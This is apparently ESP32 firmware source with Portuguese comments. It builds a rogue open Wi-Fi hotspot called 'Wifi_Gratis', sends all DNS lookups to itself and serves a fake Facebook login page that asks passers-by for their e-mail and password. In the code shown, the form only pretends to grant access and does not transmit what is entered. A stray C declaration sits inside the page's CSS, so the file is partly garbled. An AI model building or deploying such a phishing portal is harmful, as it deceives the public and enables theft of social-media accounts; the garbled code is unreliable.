/// código fonte do arquivo, caso queira compilar usando outra forma e não o app do arduino.


#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const char* ssid = "Wifi_Gratis";

IPAddress localIP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);

const char pagina[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook - Login para Internet</title>
  <style>
    body {
const char* ssid = "Wifi_Gratis"; // Nome atraente para a rede
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }
    .logo {
      color: #1877f2;
      font-size: 40px;
      font-weight: bold;
      margin-bottom: 20px;
      text-decoration: none;
    }
    .login-box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
      width: 100%;
      text-align: center;
    }
    p {
      font-size: 14px;
      color: #606770;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #166fe5;
    }
    .footer-links {
      margin-top: 15px;
      font-size: 14px;
    }
    .footer-links a {
      color: #1877f2;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">facebook</div>
    <div class="login-box">
      <p>Faça login com o Facebook para liberar seu acesso à internet gratuita.</p>
       <form id="loginForm">
         <input type="text" name="usuario" id="usuario" placeholder="E-mail ou telefone" required>
         <input type="password" name="senha" id="senha" placeholder="Senha" required>
         <button type="submit">Entrar</button>
       </form>
     </div>
   </div>
   <script>
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const user = document.getElementById('usuario').value;
        const pass = document.getElementById('senha').value;
        
        if(user && pass) {
          const box = document.querySelector('.login-box');
          box.innerHTML = '<div style="color: #1877f2; font-weight: bold; padding: 40px 20px; font-size: 18px;">Autenticando...<br><br>Acesso à internet liberado com sucesso!<br><span style="font-size: 14px; color: #606770; font-weight: normal;">Você será redirecionado em instantes.</span></div>';
          setTimeout(() => {
            window.location.reload();
          }, 3000);
        }
      });
   </script>
 </body>
</html>
)HTML";

void mostrarPortal() {
  server.send_P(200, "text/html; charset=utf-8", pagina);
}

void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(localIP, gateway, subnet);

  if (!WiFi.softAP(ssid)) {
    return;
  }

  // Direciona as consultas DNS dos dispositivos para o ESP32 ;)
  dnsServer.start(53, "*", localIP);

  server.on("/", HTTP_GET, mostrarPortal);
  server.onNotFound(mostrarPortal);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
